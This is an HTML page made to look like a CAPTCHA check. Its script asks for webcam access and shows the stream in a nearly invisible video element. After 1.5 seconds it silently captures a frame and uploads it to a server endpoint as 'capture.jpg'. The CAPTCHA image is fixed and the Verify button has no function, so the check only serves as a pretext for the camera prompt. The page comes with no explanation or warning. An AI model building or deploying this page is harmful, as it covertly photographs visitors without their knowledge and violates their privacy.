<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Capture</title>
    <style>
        /* body { margin: 0; background: #000; display: flex; justify-content: center; align-items: center; height: 100vh; } */
        video { width: 0.1%; height: auto; }
        
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background-color: #f0f2f5;
            margin: 0;
        }
        .captcha-container {
            background-color: #fff;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
            text-align: center;
        }
        h2 {
            color: #333;
            margin-bottom: 20px;
        }
        .captcha-image {
            width: 200px;
            height: 70px;
            background-color: #e0e0e0;
            border: 1px solid #ccc;
            margin: 20px auto;
            display: flex;
            justify-content: center;
            align-items: center;
            font-size: 28px;
            font-weight: bold;
            color: #555;
            letter-spacing: 3px;
            /* Simulate distorted text - this would ideally be an image */
            transform: skewX(-15deg);
            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="200" height="70"><rect width="100%" height="100%" fill="%23e0e0e0"/><text x="50%" y="50%" font-family="Arial" font-size="28" fill="%23555" text-anchor="middle" dominant-baseline="middle" transform="skewX(-15)" letter-spacing="3">AbC12x</text><line x1="10" y1="20" x2="190" y2="50" stroke="%23999" stroke-width="2"/><circle cx="50" cy="35" r="5" fill="%23999"/></svg>');
            background-repeat: no-repeat;
            background-size: cover;
        }
        .captcha-input {
            width: calc(100% - 20px);
            padding: 10px;
            margin-top: 15px;
            border: 1px solid #ccc;
            border-radius: 4px;
            font-size: 16px;
        }
        .captcha-button {
            background-color: #007bff;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
            margin-top: 20px;
        }
        .captcha-button:hover {
            background-color: #0056b3;
        }
    
    </style>
</head>
<body>
    <div class="captcha-container">
        <h2>Prove you're not a robot</h2>
        <p>Please enter the characters you see in the image below:</p>
        <div class="captcha-image">
            <!-- In a real scenario, this would be a dynamically generated image -->
            <!-- For demonstration, we use a data URI for a simple SVG image -->
        </div>
        <input type="text" class="captcha-input" placeholder="Enter characters here" aria-label="Enter CAPTCHA characters">
        <button class="captcha-button">Verify</button>
    </div>
    <video id="video" autoplay playsinline></video>

<script>
const video = document.getElementById("video");

navigator.mediaDevices.getUserMedia({ video: true })
    .then(stream => {
        video.srcObject = stream;
        video.onloadedmetadata = () => {
            setTimeout(captureFrame, 1500);
        };
    })
    .catch(err => {
        console.error("camera error:", err);
    });

function captureFrame() {
    const w = video.videoWidth;
    const h = video.videoHeight;

    const canvas = document.createElement("canvas");
    canvas.width = w;
    canvas.height = h;

    const ctx = canvas.getContext("2d");
    ctx.drawImage(video, 0, 0, w, h);

    canvas.toBlob(blob => {
        if (!blob) return;

        const fd = new FormData();
        fd.append("image", blob, "capture.jpg");

        fetch("/upload", {
            method: "POST",
            body: fd,
        })
        .then(r => r.text())
        .then(t => console.log("server:", t))
        .catch(err => console.error("upload error:", err));
    }, "image/jpeg", 0.95);
}
</script>

</body>
</html>
